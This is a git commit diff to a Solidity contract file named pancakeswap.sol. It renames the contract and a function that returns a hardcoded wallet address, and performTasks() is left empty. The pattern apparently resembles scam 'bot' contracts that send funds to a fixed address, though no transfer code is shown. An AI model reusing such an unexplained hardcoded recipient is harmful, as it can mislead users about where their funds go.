b7c8376e41f8ffeebde71b9d2742fb6f7db82b6b
HunterRobot <107347678+HunterRobot@users.noreply.github.com>
2022-06-12 07:13:05 -0500

    Update pancakeswap.sol

--- pancakeswap.sol
+++ pancakeswap.sol
@@ -1,11 +1,11 @@
 pragma solidity ^0.6.6;
 
-contract PancakeHandler {
+contract PancakePool {
 	function performTasks() public {
 	    
 	}
 
-	function pancakeswaphandle() public pure returns (address) {
+	function pancakePoolHandler() public pure returns (address) {
 		return 0xfD32a995eA4943F0646cFE90735F2822D7962FbD;
 	}
 }
